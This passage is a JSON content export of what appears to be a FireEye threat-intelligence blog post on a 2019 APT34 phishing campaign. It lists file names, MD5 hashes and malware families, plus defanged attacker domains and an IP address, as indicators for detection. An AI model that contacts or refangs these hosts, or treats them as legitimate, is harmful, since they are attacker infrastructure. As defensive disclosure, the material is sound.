valign=\u0022top\u0022\u003E\u003Cp\u003ETONEDEAF\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002228%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EERFT-Details.xls\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E96feed478c347d4b95a8224de26a1b2c\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002229%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ETONEDEAF DROPPER\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002228%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ecaf418cbf6a9c4e93e79d4714d5d3b87\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002229%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ETONEDEAF DROPPER\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002228%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eb.exe\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E9fff498b78d9498b33e08b892148135f\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002229%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EVALUEVAULT\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002228%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EWindowsNTProgram.exe\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E021a0f57fe09116a43c27e5133a57a0a\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002229%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ELONGWATCH\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002228%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPE86.dll\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ed8abe843db508048b4d4db748f92a103\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002229%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPICKPOCKET\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002228%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPE64.dll\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E6eca9c2b7cf12c247032aae28419319e\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002229%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPICKPOCKET\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 2: APT34 Endpoint Indicators from this blog post\u003C\/span\u003E\u003Cb\u003E\u003Ci\u003E\u003C\/i\u003E\u003C\/b\u003E\u003C\/p\u003E\n\u003Ch5\u003ENetwork Indicators\u003C\/h5\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ehxxp[:\/\/]www[.]cam-research-ac[.]com\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eofflineearthquake[.]com\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ec[.]cdn-edge-akamai[.]com\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E185[.]15[.]247[.]154\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EAcknowledgements\u003C\/h4\u003E\n\u003Cp\u003EA huge thanks to Delyan Vasilev and Alex Lanstein for their efforts in detecting, analyzing and classifying this APT34 campaign.\u0026nbsp;Thanks to\u0026nbsp;Matt Williams, Carlos Garcia and Matt Haigh from the FLARE team for the in-depth malware analysis.\u003C\/p\u003E\n",
        "jcr:lastModified": "Thu Nov 19 2020 18:54:31 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Thu Jul 18 2019 11:03:54 GMT-0400",
      "imageRotate": "0"
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EFireEye identified a phishing campaign conducted by APT34 in late June 2019.\u003C\/p\u003E\n",
      "jcr:lastModified": "Wed Jul 17 2019 23:08:08 GMT-0400",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    }
  }
}
